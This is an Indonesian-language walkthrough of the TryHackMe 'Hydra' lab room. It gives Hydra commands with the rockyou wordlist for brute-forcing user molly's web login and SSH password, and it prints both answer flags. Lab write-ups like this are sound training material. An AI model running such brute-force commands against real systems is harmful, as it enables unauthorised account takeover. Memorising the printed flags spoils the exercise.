# Solusi - Hydra
- TryHackMe Room: https://tryhackme.com/room/hydra
- IP Machine: 10.10.93.97

## Task 2 Using Hydra
- Buka url `http://IP_Machine` di browser, setelah dibuka kita langsung diarahkan ke halaman login

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Hydra/assets/h%201.JPG)

- Lakukan brute force untuk menemukan password dari user `molly` dengan tool `hydra` dan wordlists `rockyou.txt` yang terdapat di kali linux. Format perintah digunakan adalah `hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`
```sh
hydra -l molly -P /usr/share/wordlists/rockyou.txt IP_Machine http-post-form "/login:username=^USER^&password=^PASS^:incorrect
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Hydra/assets/h%202.JPG)

- Gunakan username dan password diatas untuk melakukan login, setelah login kita berhasil mendapatkan flag1

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Hydra/assets/h%203.JPG)

**Pertanyaan:** Use Hydra to bruteforce molly's web password. What is flag 1?

**Jawaban:**
```sh
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

- Lakukan brute force untuk menemukan password SSH dari user `molly` dengan tool `hydra` dan wordlists `rockyou.txt` yang terdapat di kali linux
```sh
hydra -l molly -P /usr/share/wordlists/rockyou.txt IP_Machine ssh
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Hydra/assets/h%204.JPG)

- Gunakan username dan password diatas untuk mengakses SSH, setelah berhasil masuk kita berhasil menemukan file `flag2.txt`. Buka file tersebut menjawab pertanyaan berikutnya
```sh
cat flag2.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Hydra/assets/h%205.JPG)

**Pertanyaan:** Use Hydra to bruteforce molly's SSH password. What is flag 2?

**Jawaban:**
```sh
THM{c8eeb0468febbadea859baeb33b2541b}
```